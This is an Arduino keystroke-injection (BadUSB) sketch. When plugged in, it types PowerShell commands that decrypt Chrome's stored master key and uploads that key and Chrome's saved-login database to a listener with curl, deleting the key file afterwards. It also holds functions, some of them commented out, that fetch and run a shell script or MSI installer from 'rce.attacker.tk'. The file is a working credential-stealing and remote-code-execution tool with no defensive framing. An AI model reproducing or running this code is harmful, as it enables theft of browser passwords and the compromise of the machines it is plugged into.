#include <Keyboard.h>


void msgbox_run(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(250);
  Keyboard.releaseAll();
  //Keyboard.print("msiexec /i http://rce.attacker.tk/1.msi /quiet");
  Keyboard.print("cmd");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(100);
  Keyboard.print("mshta \"javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Message!', 10, 'Title!', 64 );close()\" & exit");
  delay(100);
  Keyboard.write(KEY_RETURN);
}

void windows_run() {
  //msgbox_run();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_PRINT_SCREEN);
  delay(200);
  Keyboard.releaseAll();
  delay(100);
  msgbox_run();
}
void linux_run() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(250);
  Keyboard.releaseAll();
  Keyboard.print("curl -L http://rce.attacker.tk/1.sh|bash -");
  delay(100);
  Keyboard.write(KEY_RETURN);
}
void rce() {
  windows_run();
  delay(100);
  //linux_run();
  //delay(100);
}

void decrypt_master_key(){
  Keyboard.write(KEY_LEFT_GUI);
  delay(250);
  Keyboard.print("powershell");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);
  
  Keyboard.print("Add-Type -Assembly System.Security");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);

  Keyboard.print("$ExtensionFile = \"$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State\"");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);

  Keyboard.print("$jsondata = Get-Content -Raw -Path $ExtensionFile | ConvertFrom-Json");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);

  Keyboard.print("$encKey = [System.Convert]::FromBase64String($jsondata.os_crypt.encrypted_key.ToString());");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);

  Keyboard.print("$encKey= $encKey[5..$encKey.Length];");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);

  Keyboard.print("$decKey=[System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);
  
  Keyboard.print("$decKey > test.bin");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);

}

void switchLang() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_ALT);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.releaseAll();
}

void send_master_key(String host, String port){
  Keyboard.write(KEY_LEFT_GUI);
  delay(250);
  Keyboard.print("cmd /c curl -T C:\\Users\\user\\test.bin -s " + host + ":" + port + " & del C:\\Users\\user\\test.bin");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);
}

void send_data_base(String host, String port){
  Keyboard.write(KEY_LEFT_GUI);
  delay(250);
  Keyboard.print("cmd /c curl -T \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\default\\Login Data\" -s " + host + ":" + port);
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(250);
  Keyboard.write(KEY_RETURN);
  delay(250);
}

void setup() {
  Keyboard.begin();
  delay(2000);
  decrypt_master_key();
  send_master_key("localhost", "8000");
  send_data_base("localhost", "8000");
}
void loop(){  }

